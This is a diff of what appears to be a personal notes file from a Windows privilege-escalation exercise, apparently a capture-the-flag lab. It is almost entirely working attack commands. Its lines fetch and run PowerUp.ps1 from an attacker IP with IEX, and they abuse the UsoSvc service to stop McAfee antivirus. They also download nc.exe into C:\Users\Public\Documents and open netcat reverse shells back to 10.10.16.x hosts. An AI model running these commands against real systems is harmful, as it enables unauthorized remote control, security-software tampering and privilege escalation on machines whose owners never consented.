@@ -1,5 +1,5 @@
 powershell.exe powerup.ps1
-powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.51:8000/powerup.ps1'); Invoke-AllChecks" 
+
 
 C:\Windows\system32\svchost.exe -k netsvcs -p
 
@@ -19,11 +19,15 @@ powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:
 
 powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.32:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'net stop "McAfee McShield"'
 
-powershell.exe Invoke-WebRequest -Uri 'http://10.10.16.51:8000/nc.exe' -OutFile 'C:\Users\Public\Documents\nc.exe'
 
-powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.51:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\Users\Public\Documents\nc.exe 10.10.16.51 5555 -e cmd.exe'
 
-nc.exe 10.10.16.51 6666 -e cmd.exe
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.51:8000/powerup.ps1'); Invoke-AllChecks" 
+
+powershell.exe Invoke-WebRequest -Uri 'http://10.10.16.66:8000/nc.exe' -OutFile 'C:\Users\Public\Documents\nc.exe'
+
+powershell -c "IEX(NEW-Object Net.WebClient).downloadString('http://10.10.16.66:8000/powerup.ps1');Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\Users\Public\Documents\nc.exe 10.10.16.66 5555 -e cmd.exe'"
+
+cd C:\Users\Public\Documents\ & nc.exe 10.10.16.66 6666 -e cmd.exe
 
 
 
